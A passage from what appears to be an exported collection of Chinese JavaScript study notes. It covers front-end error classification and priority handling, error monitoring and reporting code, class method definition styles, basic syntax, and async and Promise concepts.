errorMap[error.status] || \n            { priority: 'P2', type: 'Unknown' };\n\n        return {\n            category: 'Network',\n            subType: type,\n            priority,\n            error,\n            endpoint: error.config?.url,\n            status: error.status\n        };\n    }\n\n    // 2.2 资源加载错误\n    static handleResourceError(error) {\n        return {\n            category: 'Network',\n            subType: 'Resource',\n            priority: 'P1',\n            error,\n            resource: error.target?.src || error.target?.href\n        };\n    }\n}\n```\n\n### 1.3. 业务逻辑错误 (Business Logic Errors)\n\n>  都是用户==预定义的错误类型==\n\n- 表单验证错误\n- 状态管理错误\n- 用户操作错误\n\n```javascript hl:2,14,25\nclass BusinessErrorHandler {\n    // 3.1 表单验证错误\n    static handleValidationError(error) {\n        return {\n            category: 'Business',\n            subType: 'Validation',\n            priority: 'P2',\n            error,\n            field: error.field,\n            value: error.value\n        };\n    }\n\n    // 3.2 状态管理错误\n    static handleStateError(error) {\n        return {\n            category: 'Business',\n            subType: 'State',\n            priority: 'P1',\n            error,\n            state: error.state\n        };\n    }\n\n    // 3.3 用户操作错误\n    static handleUserOperationError(error) {\n        return {\n            category: 'Business',\n            subType: 'UserOperation',\n            priority: 'P3',\n            error,\n            operation: error.operation\n        };\n    }\n}\n```\n\n### 1.4. 性能错误 (Performance Issues)\n\n- 性能错误\n\t- FCP：First Contentful Paint\n\t- FID：First Input Delay\n\t- LCP：\n\t- 等\n- 内存错误\n\n```javascript\nclass PerformanceErrorHandler {\n    // 4.1 加载性能\n    static handleLoadingPerformance(metrics) {\n        const thresholds = {\n            FCP: 2000,  // First Contentful Paint\n            LCP: 2500,  // Largest Contentful Paint\n            FID: 100,   // First Input Delay\n            CLS: 0.1    // Cumulative Layout Shift\n        };\n\n        return {\n            category: 'Performance',\n            subType: 'Loading',\n            priority: metrics.value > thresholds[metrics.name] ? 'P1' : 'P3',\n            metrics\n        };\n    }\n\n    // 4.2 内存性能\n    static handleMemoryPerformance(usage) {\n        return {\n            category: 'Performance',\n            subType: 'Memory',\n            priority: usage.overLimit ? 'P1' : 'P2',\n            usage\n        };\n    }\n}\n```\n\n## 2. 优先级管理系统\n\n### 2.1. 优先级定义\n\n```javascript\nconst PriorityDefinition = {\n    P0: {\n        description: '致命错误',\n        responseTime: '立即',\n        impact: '整个应用不可用',\n        examples: ['白屏', '无法登录', '支付流程中断'],\n        notification: 'immediate',\n        autoRetry: true\n    },\n    P1: {\n        description: '严重错误',\n        responseTime: '24小时内',\n        impact: '主要功能受影响',\n        examples: ['主要API失败', '核心模块异常', '数据丢失'],\n        notification: 'urgent',\n        autoRetry: true\n    },\n    P2: {\n        description: '一般错误',\n        responseTime: '72小时内',\n        impact: '次要功能受影响',\n        examples: ['非核心API错误', 'UI显示异常', '性能下降'],\n        notification: 'normal',\n        autoRetry: false\n    },\n    P3: {\n        description: '轻微错误',\n        responseTime: '下次迭代',\n        impact: '体验轻微受影响',\n        examples: ['控制台警告', '非关键资源加载失败'],\n        notification: 'batch',\n        autoRetry: false\n    }\n};\n```\n\n### 2.2. 错误处理中心\n\n```javascript\nclass ErrorCenter {\n    static instance = null;\n\n    constructor() {\n        this.errorQueue = new Map();\n        this.errorHandlers = new Map();\n        this.initializeHandlers();\n    }\n\n    static getInstance() {\n        if (!this.instance) {\n            this.instance = new ErrorCenter();\n        }\n        return this.instance;\n    }\n\n    initializeHandlers() {\n        // 注册各种错误处理器\n        this.registerHandler('Runtime', new RuntimeErrorHandler());\n        this.registerHandler('Network', new NetworkErrorHandler());\n        this.registerHandler('Business', new BusinessErrorHandler());\n        this.registerHandler('Performance', new PerformanceErrorHandler());\n    }\n\n    handleError(error) {\n        const errorInfo = this.categorizeError(error);\n        this.processError(errorInfo);\n    }\n\n    categorizeError(error) {\n        // 根据错误类型分类\n        if (error instanceof TypeError) {\n            return RuntimeErrorHandler.handleTypeError(error);\n        }\n        // ... 其他错误类型判断\n    }\n\n    processError(errorInfo) {\n        const { priority } = errorInfo;\n        \n        // 根据优先级处理\n        switch(priority) {\n            case 'P0':\n                this.handleP0Error(errorInfo);\n                break;\n            case 'P1':\n                this.handleP1Error(errorInfo);\n                break;\n            // ... 其他优先级处理\n        }\n    }\n\n    handleP0Error(errorInfo) {\n        // 1. 立即上报\n        this.reportError(errorInfo);\n        \n        // 2. 触发告警\n        this.triggerAlert(errorInfo);\n        \n        // 3. 尝试恢复\n        this.attemptRecovery(errorInfo);\n        \n        // 4. 用户提示\n        this.notifyUser(errorInfo);\n    }\n}\n```\n\n## 3. 错误监控与上报策略\n\n### 3.1. 全局错误监听\n\n```javascript\nclass ErrorMonitor {\n    static initialize() {\n        // 1. JavaScript 运行时错误\n        window.onerror = (message, source, lineno, colno, error) => {\n            ErrorCenter.getInstance().handleError({\n                type: 'Runtime',\n                error,\n                context: { message, source, lineno, colno }\n            });\n        };\n\n        // 2. Promise 未捕获异常\n        window.addEventListener('unhandledrejection', (event) => {\n            ErrorCenter.getInstance().handleError({\n                type: 'Promise',\n                error: event.reason\n            });\n        });\n\n        // 3. 资源加载错误\n        window.addEventListener('error', (event) => {\n            if (event.target && (event.target.tagName === 'SCRIPT' || event.target.tagName === 'LINK')) {\n                ErrorCenter.getInstance().handleError({\n                    type: 'Resource',\n                    error: event\n                });\n            }\n        }, true);\n    }\n}\n```\n\n### 3.2. 错误上报策略\n\n- 立即上报\n- 列队批量上报\n\n```javascript\nclass ErrorReporter {\n    constructor() {\n        this.queue = [];\n        this.batchSize = 10;\n        this.batchTimeout = 5000;\n    }\n\n    report(error) {\n        const { priority } = error;\n\n        switch(priority) {\n            case 'P0':\n            case 'P1':\n                this.immediateReport(error);\n                break;\n            case 'P2':\n            case 'P3':\n                this.queueReport(error);\n                break;\n        }\n    }\n\n    immediateReport(error) {\n        const data = this.formatError(error);\n        this.sendToServer(data);\n    }\n\n    queueReport(error) {\n        this.queue.push(error);\n        \n        if (this.queue.length >= this.batchSize) {\n            this.flushQueue();\n        }\n    }\n\n    formatError(error) {\n        return {\n            ...error,\n            timestamp: new Date().toISOString(),\n            userInfo: this.getUserInfo(),\n            environment: process.env.NODE_ENV,\n            version: process.env.VERSION,\n            url: window.location.href\n        };\n    }\n}\n```\n\n### 3.3. 错误恢复策略\n\n- 重试：比如网络请求重试\n- 降级：比如 SSR → CSR 等\n\n```javascript\nclass ErrorRecovery {\n    static async attemptRecovery(error) {\n        const strategies = {\n            Network: async () => {\n                await this.retryRequest(error);\n            },\n            State: () => {\n                this.resetState(error);\n            },\n            Resource: async () => {\n                await this.reloadResource(error);\n            }\n        };\n\n        const strategy = strategies[error.category];\n        if (strategy) {\n            await strategy();\n        }\n    }\n\n    static async retryRequest(error, maxRetries = 3) {\n        let retries = 0;\n        while (retries < maxRetries) {\n            try {\n                await new Promise(resolve => setTimeout(resolve, 1000 * Math.pow(2, retries)));\n                const response = await fetch(error.endpoint);\n                if (response.ok) return response;\n            } catch (e) {\n                retries++;\n            }\n        }\n        throw new Error('Max retries reached');\n    }\n}\n```\n\n## 4. 最佳实践建议\n\n1. **错误分类准则**\n   - 按==影响范围==分类\n   - 按==错误来源==分类\n   - 按==处理紧急程度==分类\n\n2. **优先级确定因素**\n   - 用户影响程度\n   - 业务重要性\n   - 修复难度\n   - 影响范围\n\n3. **监控指标**\n   - 错误发生率\n   - 影响用户数\n   - 错误持续时间\n   - 修复时间\n\n4. **处理流程**\n   - 及时发现\n   - 准确分类\n   - 优先级排序\n   - 及时处理\n   - 复盘总结\n\n","800WyJFR":"\n# 前端错误的分类和优先级管理建议\n\n`#javascript` \n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- 错误分级\n- 优先级定义\n- 错误处理体系\n\n## 1. 错误分类体系\n\n### 1.1. 致命错误（P0级）：白屏、崩溃、安全漏洞、业务流中断\n\n这类错误会导致应用完全无法使用或核心功能瘫痪\n==需要立即处理==的场景：\n- 白屏 & 应用崩溃\n- 核心业务流程中断\n- 数据丢失\n- 安全漏洞\n动作：\n- 立即上报并通知相关人员\n- 可能需要执行==紧急恢复措施==\n\n\n```javascript hl:4,13,24,26\n// 错误监控示例\nclass CriticalErrorMonitor {\n    static monitor() {\n        // 1. JavaScript运行时错误\n        window.onerror = (message, source, lineno, colno, error) => {\n            this.handleCriticalError({\n                type: 'RuntimeError',\n                level: 'P0',\n                details: { message, source, lineno, colno, error }\n            });\n        };\n\n        // 2. Promise未捕获错误\n        window.addEventListener('unhandledrejection', (event) => {\n            this.handleCriticalError({\n                type: 'UnhandledPromiseRejection',\n                level: 'P0',\n                details: { reason: event.reason }\n            });\n        });\n    }\n\n    static handleCriticalError(errorInfo) {\n        // 立即上报并通知相关人员\n        ErrorReporter.reportImmediately(errorInfo);\n        // 可能需要执行紧急恢复措施\n        ErrorRecovery.attemptRecovery(errorInfo);\n    }\n}\n```\n\n### 1.2. 严重错误（P1级）： ==影响主要功能但不会导致应用完全不可用==\n\n```javascript\nclass SevereErrorHandler {\n    static handle(error) {\n        const errorInfo = {\n            level: 'P1',\n            timestamp: new Date().toISOString(),\n            type: this.classifyError(error),\n            impact: this.assessImpact(error)\n        };\n\n        // 错误分类和上报\n        switch(errorInfo.type) {\n            case 'API_ERROR':\n                this.handleAPIError(error);\n                break;\n            case 'RESOURCE_ERROR':\n                this.handleResourceError(error);\n                break;\n            case 'STATE_ERROR':\n                this.handleStateError(error);\n                break;\n        }\n    }\n\n    static classifyError(error) {\n        // 错误分类逻辑\n    }\n\n    static assessImpact(error) {\n        // 评估影响范围\n    }\n}\n```\n\n主要关注场景：\n- 主要功能模块异常\n- 关键 API 接口错误\n\t- API_ERROR\n- ==重要资源==加载失败\n\t- RESOURCE_ERROR\n- 状态管理错误\n\t- STATE_ERROR\n- 评估影响范围\n\n### 1.3. 一般错误（P2级）： 影响用户体验但不影响核心功能\n\n```javascript\nclass GeneralErrorMonitor {\n    static monitorPerformance() {\n        // 性能监控\n        const observer = new PerformanceObserver((list) => {\n            const entries = list.getEntries();\n            entries.forEach(entry => {\n                if (this.isPerformanceIssue(entry)) {\n                    this.reportPerformanceIssue(entry);\n                }\n            });\n        });\n\n        observer.observe({ entryTypes: ['paint', 'largest-contentful-paint', 'first-input'] });\n    }\n\n    static isPerformanceIssue(entry) {\n        const thresholds = {\n            'first-contentful-paint': 2000,\n            'largest-contentful-paint': 2500,\n            'first-input-delay': 100\n        };\n        return entry.duration > thresholds[entry.entryType];\n    }\n}\n```\n\n监控项目：\n- 性能问题\n- UI 渲染异常\n- 非核心功能异常\n- 用户体验问题\n\n### 1.4. P3：优化类问题：下次迭代优化\n\n## 2. 错误处理最佳实践\n\n### 2.1. 统一错误管理中心\n\n上报信息统一处理\n- 级别\n- 堆栈信息\n- 时间戳\n- 上下文信息\n\t- url\n\t- ua 信息等\n\n```javascript hl:24\nclass ErrorCenter {\n    private static instance: ErrorCenter;\n    private errorQueue: Array<ErrorInfo> = [];\n\n    static getInstance() {\n        if (!ErrorCenter.instance) {\n            ErrorCenter.instance = new ErrorCenter();\n        }\n        return ErrorCenter.instance;\n    }\n\n    handleError(error: Error, level: ErrorLevel) {\n        const errorInfo = this.formatError(error, level);\n        \n        if (level === 'P0' || level === 'P1') {\n            this.reportImmediately(errorInfo);\n        } else {\n            this.queueError(errorInfo);\n        }\n\n        this.triggerRecovery(errorInfo);\n    }\n\n    private formatError(error: Error, level: ErrorLevel): ErrorInfo {\n        return {\n            level,\n            message: error.message,\n            stack: error.stack,\n            timestamp: new Date().toISOString(),\n            context: this.getErrorContext()\n        };\n    }\n\n    private getErrorContext() {\n        return {\n            url: window.location.href,\n            userAgent: navigator.userAgent,\n            timestamp: Date.now(),\n            // 其他上下文信息\n        };\n    }\n}\n```\n\n### 2.2. 错误恢复策略 → 比如 降级、重试机制\n\n```javascript\nclass ErrorRecovery {\n    static async attemptRecovery(error: ErrorInfo) {\n        const strategies = {\n            NetworkError: this.handleNetworkError,\n            StateError: this.handleStateError,\n            ResourceError: this.handleResourceError\n        };\n\n        const strategy = strategies[error.type];\n        if (strategy) {\n            await strategy(error);\n        }\n    }\n\n    private static async handleNetworkError(error: ErrorInfo) {\n        // 实现网络错误恢复策略\n        const maxRetries = 3;\n        let retryCount = 0;\n\n        while (retryCount < maxRetries) {\n            try {\n                await this.retryRequest(error.request);\n                break;\n            } catch (e) {\n                retryCount++;\n                await this.delay(Math.pow(2, retryCount) * 1000); // 指数退避\n            }\n        }\n    }\n}\n```\n\n### 2.3. 错误上报策略\n\n- 立即上报，并通知拉群\n- 批量上报情况\n\n```javascript\nclass ErrorReporter {\n    private static batchSize = 10;\n    private static batchTimeout = 5000;\n    private static errorQueue: ErrorInfo[] = [];\n    private static timer: NodeJS.Timeout | null = null;\n\n    static queueError(error: ErrorInfo) {\n        this.errorQueue.push(error);\n\n        if (this.errorQueue.length >= this.batchSize) {\n            this.flushQueue();\n        } else if (!this.timer) {\n            this.timer = setTimeout(() => this.flushQueue(), this.batchTimeout);\n        }\n    }\n\n    static async flushQueue() {\n        if (this.errorQueue.length === 0) return;\n\n        const errors = [...this.errorQueue];\n        this.errorQueue = [];\n        \n        try {\n            await this.sendToServer(errors);\n        } catch (e) {\n            // 处理上报失败的情况\n            this.handleReportFailure(errors);\n        }\n    }\n}\n```\n\n## 3. 优先级管理建议\n\n### 3.1. **优先级定义标准**\n\n- P0（立即处理）：\n\t- 影响核心业务，造成直接损失\n- P1（24小时内）：\n\t- 影响主要功能，但有临时解决方案\n- P2（72小时内）：\n\t- 影响用户体验，但不影响核心功能\n- P3（下次迭代）：\n\t- 优化类问题\n\n### 3.2. **错误处理流程**：\n\n\n1. 错误分类和优先级评估\n2. 通知相关人员\n3. 错误处理和恢复：降级、重试等\n4. 错误上报和记录\n5. 后续跟踪，==关联工单==等\n\n\n### 3.3. **监控指标设置**：\n\n   - ==错误发生率==\n   - 影响==用户数==\n   - 错误==恢复率==\n   - ==平均处理时间==\n\t   - 比如 P0 立即处理了吗\n\t   - P1 24 小时解决了吗 ？\n\n## 4. 建议\n\n### 4.1. **建立错误处理体系**：\n\n   - 制定明确的错误分类标准\n   - 设置合理的优先级评估机制\n   - 建立完整的错误处理流程\n   - 定期复盘和优化\n\n### 4.2. **工具和平台支持**：\n\n   - 使用错误监控平台（如 Sentry ）\n   - 建立错误报警机制\n   - 实现自动化处理流程\n   - 提供错误分析工具\n\n### 4.3. **团队协作**：\n\n   - 明确责任人和处理流程\n   - 建立快速响应机制\n   - 定期进行错误分析会议\n   - 持续优化和改进","2Rg1HL2H":"\n# class 中各种方法定义的区别\n\n`#javascript` \n\n\n## 目录\n<!-- toc -->\n ## 1. class中箭头函数与普通函数的 `this` 指向问题 \n\n![图片&文件](./files/20241114-20.png)\n\n```javascript hl:17,23,8\nclass Animal {\n  constructor() {\n    this.name = \"cat\";\n  }\n  // 普通函数方法,直接挂载在原型上\n  speak() {\n    // 当然，this都指向实例对象\n    console.log(this)\n    console.log(this.name);\n  }\n  // 箭头函数方法，直接挂载在 Animal 上\n  eat = () => {\n    // 当然，this 都指向实例对象\n    console.log(this.name);\n  };\n}\nconst n = new Animal();\nconst a = n.speak;\nconst b = n.eat;\n\n// 箭头函数方法： this依然指向创建的实例对象，即，箭头函数中的this始终是该箭头函数所在作用域中的this\nb(); // cat\n// 普通方法，报错，因为 方法中的this 会指向undefined ，即普通函数中的 this 是动态绑定的，始终指向函数的执行环境，\na(); // 报错\n```\n\n## 2. 总结： JavaScript class 中各种方法定义的区别：\n\n| 方法类型     | 语法                    | this 绑定 | 继承性      | 访问范围 | 内存占用   | 主要使用场景           | 示例                                                 |\n| -------- | --------------------- | ------- | -------- | ---- | ------ | ---------------- | -------------------------------------------------- |\n| 普通实例方法   | `method() {}`         | 动态绑定    | 可继承      | 公开   | 所有实例共享 | 实例的基本行为、可复用的实例方法 | `speak() { console.log(this.name) }`               |\n| 箭头函数属性   | `method = () => {}`   | 固定绑定到实例 | **不可继承** | 公开   | 每个实例单独 | 事件处理器、回调函数       | `onClick = () => { this.count++ }`                 |\n| 静态方法     | `static method() {}`  | 绑定到类    | 可继承      | 公开   | 类级别共享  | 工具函数、工厂方法        | `static create() { return new This() }`            |\n| 私有方法     | `#method() {}`        | 动态绑定    | **不可继承** | 私有   | 所有实例共享 | 内部实现、封装逻辑        | `#validate() { return true }`                      |\n| 异步方法     | `async method() {}`   | 动态绑定    | 可继承      | 公开   | 所有实例共享 | API调用、异步操作       | `async fetch() { await data }`                     |\n| 生成器方法    | `*method() {}`        | 动态绑定    | 可继承      | 公开   | 所有实例共享 | 迭代器、数据流          | `*range() { yield 1 }`                             |\n| getter方法 | `get prop() {}`       | 动态绑定    | 可继承      | 公开   | 所有实例共享 | 计算属性、只读属性        | `get fullName() { return this.first + this.last }` |\n| setter方法 | `set prop() {}`       | 动态绑定    | 可继承      | 公开   | 所有实例共享 | 属性验证、计算属性        | `set age(v) { if(v>0) this._age = v }`             |\n| 静态私有方法   | `static `#method()` {}` | 绑定到类    | **不可继承** | 私有   | 类级别共享  | 私有工具函数、内部初始化     | `static `#init()` { this.config = {} }`              |\n| 计算属性名方法  | `[expr]() {}`         | 动态绑定    | 可继承      | 公开   | 所有实例共享 | 动态方法名、Symbol方法   | `[Symbol.iterator]() {}`                           |\n\n\n1、说明\n- **内存效率排序**（从高到低）：\n\t- 静态方法（类级别共享）\n\t- 普通实例方法（原型链共享）\n\t- 箭头函数属性（每实例独立）\n- **使用建议**：\n\t- 一般方法优先使用普通实例方法（原型链共享）\n\t- 需要 this 稳定的回调用箭头函数\n\t- 工具函数使用静态方法\n\t- 内部实现使用私有方法\n\n2、**注意事项**：\n\n   ```javascript\n   class Example {\n     // 推荐：普通业务方法\n     doSomething() {}\n\n     // 推荐：事件处理器\n     handleClick = () => {}\n\n     // 推荐：工具函数\n     static utils() {}\n\n     // 推荐：内部实现\n     `#internal()` {}\n   }\n   ```\n\n3、**性能考虑**：\n\n   ```javascript\n   class Performance {\n     // 好 - 内存效率高\n     method1() {}\n\n     // 差 - 每个实例都会创建新函数\n     method2 = () => {}\n   }\n   ```\n\n4、**访问控制**：\n\n   ```javascript\n   class Access {\n     publicMethod() {}      // 外部可访问\n     `#privateMethod()` {}    // 仅内部可访问\n     static utilMethod() {} // 通过类访问\n   }\n   ```\n\n### 2.1. 所有定义方法的方式\n\n```javascript\nclass Example {\n  // 1. 普通实例方法\n  normalMethod() {}\n\n  // 2. 箭头函数属性\n  arrowMethod = () => {}\n\n  // 3. 静态方法\n  static staticMethod() {}\n\n  // 4. 私有方法（以 # 开头）\n  `#privateMethod()` {}\n\n  // 5. 异步方法\n  async asyncMethod() {}\n\n  // 6. 生成器方法\n  *generatorMethod() {}\n\n  // 7. 访问器方法（getter/setter）\n  get value() {}\n  set value(v) {}\n\n  // 8. 静态私有方法\n  static `#staticPrivateMethod()` {}\n\n  // 9. 静态代码块\n  static {\n    // 静态初始化代码\n  }\n\n  // 10. 计算属性名方法\n  [computedMethodName()]() {}\n}\n```\n\n### 2.2. 详细比较和使用场景\n\n#### 2.2.1. 普通实例方法\n\n```javascript\nclass User {\n  constructor(name) {\n    this.name = name;\n  }\n\n  // 普通实例方法\n  sayHello() {\n    console.log(`Hello, ${this.name}`);\n  }\n}\n\n// 使用场景：\n// 1. 实例的基本行为方法\n// 2. 需要访问实例属性的方法\n// 3. 可以被继承和重写的方法\n\nconst user = new User('John');\nuser.sayHello(); // \"Hello, John\"\n```\n\n#### 2.2.2. 箭头函数属性\n\n```javascript\nclass Button {\n  count = 0;\n\n  // 箭头函数属性\n  handleClick = () => {\n    this.count++;\n    console.log(this.count);\n  }\n}\n\n// 使用场景：\n// 1. 事件处理器\n// 2. 需要保持 this 上下文的回调函数\n// 3. React 组件中的方法\n\nconst button = new Button();\nconst handler = button.handleClick;\nhandler(); // this 始终指向 Button 实例\n```\n\n#### 2.2.3. 静态方法\n\n```javascript\nclass MathUtils {\n  // 静态方法\n  static add(x, y) {\n    return x + y;\n  }\n\n  static isPositive(num) {\n    return num > 0;\n  }\n}\n\n// 使用场景：\n// 1. 工具函数\n// 2. 工厂方法\n// 3. 不需要访问实例状态的方法\n\nconsole.log(MathUtils.add(1, 2)); // 3\nconsole.log(MathUtils.isPositive(5)); // true\n```\n\n#### 2.2.4. 私有方法\n\n```javascript\nclass BankAccount {\n  `#balance` = 0;\n\n  // 私有方法\n  `#validateAmount(amount)` {\n    if (amount <= 0) throw new Error('Invalid amount');\n  }\n\n  deposit(amount) {\n    this.#validateAmount(amount);\n    this.#balance += amount;\n  }\n}\n\n// 使用场景：\n// 1. 内部辅助方法\n// 2. 封装敏感逻辑\n// 3. 防止外部直接访问的方法\n\nconst account = new BankAccount();\naccount.deposit(100);\n// account.#validateAmount(50); // Error: 私有方法不能在类外部访问\n```\n\n#### 2.2.5. 异步方法\n\n```javascript\nclass DataFetcher {\n  // 异步方法\n  async fetchData() {\n    try {\n      const response = await fetch('https://api.example.com/data');\n      return await response.json();\n    } catch (error) {\n      console.error('Fetch error:', error);\n    }\n  }\n}\n\n// 使用场景：\n// 1. API 调用\n// 2. 文件操作\n// 3. 需要等待结果的操作\n\nconst fetcher = new DataFetcher();\nfetcher.fetchData().then(data => console.log(data));\n```\n\n#### 2.2.6. 生成器方法\n\n```javascript\nclass Iterator {\n  // 生成器方法\n  *range(start, end) {\n    for (let i = start; i <= end; i++) {\n      yield i;\n    }\n  }\n\n  // 可迭代对象的生成器\n  *[Symbol.iterator]() {\n    yield* this.range(1, 5);\n  }\n}\n\n// 使用场景：\n// 1. 创建自定义迭代器\n// 2. 惰性计算序列\n// 3. 处理大量数据时的内存优化\n\nconst iterator = new Iterator();\nfor (const num of iterator.range(1, 3)) {\n  console.log(num); // 1, 2, 3\n}\n```\n\n#### 2.2.7. 访问器方法\n\n```javascript\nclass Temperature {\n  `#celsius` = 0;\n\n  // getter\n  get celsius() {\n    return this.#celsius;\n  }\n\n  // setter\n  set celsius(value) {\n    this.#celsius = value;\n  }\n\n  // 计算属性的 getter\n  get fahrenheit() {\n    return this.#celsius * 9/5 + 32;\n  }\n}\n\n// 使用场景：\n// 1. 属性的读写控制\n// 2. 计算属性\n// 3. 数据验证和转换\n\nconst temp = new Temperature();\ntemp.celsius = 25;\nconsole.log(temp.fahrenheit); // 77\n```\n\n#### 2.2.8. 静态私有方法\n\n```javascript hl:5\nclass ConfigManager {\n  static `#instance` = null;\n\n  // 静态私有方法\n  static `#initialize()` {\n    // 初始化配置\n    return new ConfigManager();\n  }\n\n  static getInstance() {\n    if (!this.#instance) {\n      this.#instance = this.#initialize();\n    }\n    return this.#instance;\n  }\n}\n\n// 使用场景：\n// 1. 单例模式实现\n// 2. 私有工具函数\n// 3. 内部初始化逻辑\n```\n\n#### 2.2.9. 静态代码块\n\n```javascript\nclass Application {\n  static config;\n\n  // 静态代码块\n  static {\n    try {\n      this.config = JSON.parse(localStorage.getItem('app-config'));\n    } catch {\n      this.config = { default: true };\n    }\n  }\n}\n\n// 使用场景：\n// 1. 复杂的静态初始化\n// 2. 需要 try-catch 的初始化\n// 3. 一次性的设置代码\n```\n\n#### 2.2.10. 计算属性名方法\n\n```javascript\nconst getMethodName = () => 'handle' + 'Click';\n\nclass DynamicMethods {\n  // 计算属性名方法\n  [getMethodName()]() {\n    console.log('Clicked!');\n  }\n\n  // 使用 Symbol 作为方法名\n  [Symbol.iterator]() {\n    // ...\n  }\n}\n\n// 使用场景：\n// 1. 动态方法名\n// 2. Symbol 方法\n// 3. 元编程\n```\n\n### 2.3. 方法定义的最佳实践\n\n```javascript\nclass BestPractices {\n  // 1. 公共 API 方法使用普通方法\n  publicMethod() {}\n\n  // 2. 事件处理使用箭头函数\n  handleEvent = () => {}\n\n  // 3. 工具函数使用静态方法\n  static utility() {}\n\n  // 4. 内部逻辑使用私有方法\n  `#internalLogic()` {}\n\n  // 5. 异步操作使用 async 方法\n  async fetchData() {}\n\n  // 6. 需要计算的属性使用 getter/setter\n  get computedValue() {}\n\n  // 7. 迭代相关使用生成器\n  *createIterator() {}\n}\n```\n\n### 2.4. 性能和内存考虑\n\n```javascript\nclass Performance {\n  // 1. 原型方法 - 内存效率高\n  method1() {}\n\n  // 2. 实例方法 - 每个实例都会创建\n  method2 = () => {}\n\n  // 3. 静态方法 - 类级别共享\n  static method3() {}\n}\n\n// 创建多个实例时的内存影响\nconst instances = Array(1000).fill().map(() => new Performance());\n```\n\n### 2.5. 继承行为\n\n```javascript\nclass Parent {\n  parentMethod() {}\n  static parentStatic() {}\n}\n\nclass Child extends Parent {\n  // 可以继承和重写普通方法\n  parentMethod() {\n    super.parentMethod();\n  }\n\n  // 可以继承和重写静态方法\n  static parentStatic() {\n    super.parentStatic();\n  }\n\n  // 箭头函数和私有方法不能通过 super 访问\n}\n```\n\n### 2.6. 最佳实践建议\n\n```javascript\nclass BestPracticeExample {\n  // 使用箭头函数：\n  // 1. 需要绑定到实例的事件处理器\n  onEvent = () => {}\n  \n  // 使用普通方法：\n  // 1. 实例的业务逻辑方法\n  // 2. 需要在原型链上的方法\n  processData() {}\n  \n  // 使用静态方法：\n  // 1. 工具函数\n  // 2. 工厂方法\n  // 3. 不需要访问实例状态的方法\n  static create() {}\n}\n```","itNBoFR6":"\n# JavaScript 的核心语法\n\n`#javascript` \n\n\n## 目录\n<!-- toc -->\n ## 1. 现代模式，\"use strict\" \n\n### 1.1. 原因\n\nES5 规范增加了新的语言特性并且修改了一些已经存在的特性。为了保证旧的功能能够使用，大部分的修改是默认不生效的。\n\n你需要一个特殊的指令 —— `\"use strict\"` 来明确地激活这些特性。\n\n### 1.2. 语法\n\n```javascript\n\"use strict\"; // 必须放到开头\n\n// 代码以现代模式工作\n...\n```\n\n- 现代 JavaScript 支持 “class” 和 “module”，如果使用它们，无需添加 `\"use strict\"`\n\n## 2. 原始类型 + 1 种复杂数据类型\t\t\t\n\n- 原始类型：\n\t- Undefined、Null、Boolean、Number、String 和 Symbol  \n- 复杂类型：\n\t- Object\n\n## 3. 变量、作用域与内存\n\n### 3.1. 复制\n\n#### 3.1.1. 原始类型\n\n![image.png|712](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/e3768b3af18a23c8cdeccb85e280c323.png)\n\n#### 3.1.2. 引用类型\n\n![image.png|672](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/bb555ee9faabf851d1d0d40946117804.png)\n\n### 3.2. let、var、const 申明选择建议\n\n1. 不使用 var\n2. const 优先，let 次之\n\n> `var`就不解释了，`const` 声明可以让浏览器运行时强制保持变量不变，也可以让静态代码分析工具提前发现不合法的赋值操作\n\n## 4. 其他的不展开了","x45wL9Jh":"\n# JavaScript 异步编程简介\n\n`#javascript` \n\n**JavaScript 异步编程**是一种处理非阻塞操作的编程方式，允许程序在**等待某些操作完成时继续执行其他代码**。\n- 这对于处理如**网络请求、文件操作**等可能耗时的任务特别重要\n- 以下是 JavaScript 异步编程的主要方法和概念：\n\t1. 回调函数 (Callbacks)\n\t\t- 最基本的异步编程方式\n\t\t- 将一个函数作为参数传递给另一个函数，在操作完成时调用\n\t\t- 容易导致\"回调地狱\"，使代码难以维护\n\t2. Promise\n\t\t- ES6 引入的异步编程解决方案\n\t\t- 代表一个异步操作的最终完成或失败\n\t\t- 使用 .then() 和 .catch() 方法处理结果和错误\n\t\t- 可以链式调用，避免回调地狱\n\t3. Async/Await\n\t\t- 基于 Promise 的语法糖，使异步代码更易读\n\t\t- async 关键字用于声明异步函数\n\t\t- await 关键字用于等待 Promise 解决\n\t\t- 使异步代码**看起来像同步代码**\n\t4. 事件循环 (Event Loop)\n\t\t- JavaScript 运行时的核心机制\n\t\t- 管理异步操作的执行顺序\n\t\t- 包括宏任务队列和微任务队列\n\t5. 定时器函数\n\t\t- setTimeout() 和 setInterval() 用于延迟执行或定期执行代码\n\t6. 事件监听器\n\t\t- 用于响应用户交互或其他事件\n\t7. Fetch API\n\t\t- **用于进行网络请求的现代接口**\n\t\t- 返回 `Promise`，便于处理响应\n\t\t- ==和 XHR 没关系==\n\t8. Web Workers：新开线程\n\t\t- 允许在**后台线程**中运行脚本，不影响主线程性能\n","Q4CM1x9a":"\n# JavaScript 异步编程：Promise 专题\n\n`#js` `#javascript` `#R2` \n\n\n## 目录\n<!-- toc -->\n ## 1. 要点总结 \n\n- `Promise`的状态一经改变就不能再改变\n- `.then`和`.catch`都会返回一个新的`Promise`\n- `catch`不管被连接到哪里，都能**捕获上层的错误**\n\t- 但也有可能被它上面的 then 的第二个参数捕获，捕获后 catch 就捕获不到错误了\n- 在`Promise`中，返回任意一个非 `promise` 的值都会被包裹成 `promise` 对象\n\t- 例如`return 2`会被包装为`return Promise.resolve(2)`。\n- `Promise` 的 `.then` 或者 `.catch` **可以被调用多次**,\n\t- 但如果`Promise`内部的状态一经改变，并且有了一个值\n\t\t- 那么后续每次调用`.then`或者`.catch`的时候==都会直接拿到该值==\n\t\t\t- 注意，状态改变了，后面仍然可以调用 then 和 catch，一直调用\n- `.then` 或者 `.catch` 中 `return` 一个 `error` 对象并不会抛出错误\n\t- 所以不会被后续的 `.catch` 捕获 \n- `.then` 或 `.catch` 返回的值不能是 **promise 本身**，否则会造成**死循环**\n- `.then` 或者 `.catch` 的参数期望是函数，传入非函数则会发生**值透传**。\n- `.then`方法是能接收两个参数的\n\t- 第一个是处理成功的函数\n\t- 第二个是处理失败的函数\n\t- 在某些时候你可以认为`catch`是`.then`第二个参数的简便写法\n- `.finally`方法也是返回一个`Promise`\n\t- 他在`Promise`结束的时候，无论结果为`resolved`还是`rejected`，都会执行里面的回调函数\n\t- 它**不接受任何参数**\n\n## 2. 打印 new Promise 的效果\n\n```javascript hl:1\nPromise { <fulfilled>: value }   // 注意：不是 Promise { <resolved> } \nPromise { <pending> }\nPromise { <rejected>: reason }  \n```\n\n## 3. 没有 resolve 